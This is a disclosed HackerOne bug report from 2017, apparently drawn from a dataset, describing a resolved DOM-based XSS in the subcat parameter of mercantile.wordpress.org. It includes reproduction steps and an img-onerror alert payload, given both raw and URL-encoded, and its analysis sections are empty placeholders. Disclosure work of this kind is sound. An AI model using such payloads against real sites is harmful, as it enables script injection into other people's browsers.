---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '230435'
original_report_id: '230435'
title: DOM Based XSS In mercantile.wordpress.org
weakness: Cross-site Scripting (XSS) - DOM
team_handle: wordpress
created_at: '2017-05-21T10:15:00.019Z'
disclosed_at: '2017-06-14T05:23:11.631Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 21
tags:
- hackerone
- cross-site-scripting-xss-dom
---

# DOM Based XSS In mercantile.wordpress.org

## Metadata

- HackerOne Report ID: 230435
- Weakness: Cross-site Scripting (XSS) - DOM
- Program: wordpress
- Disclosed At: 2017-06-14T05:23:11.631Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hello,
There is a DOM XSS in mercantile.wordpress.org in the apparel subcat.
For example: https://mercantile.wordpress.org/product-category/apparel/?subcat=<html payload>

Steps To Reproduce
1. Go to https://mercantile.wordpress.org
2. Click on apparel
3. In the url bar add :  /?subcat="><img src=x onerror=alert(document.domain)>
The domain will pop-up.

Or alternatively just click on the link to: https://mercantile.wordpress.org/product-category/apparel/?subcat=%22%3E%3Cimg%20src=x%20onerror=alert(document.domain)%3E

Hope this helps.
Sincerely,
Pablo

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
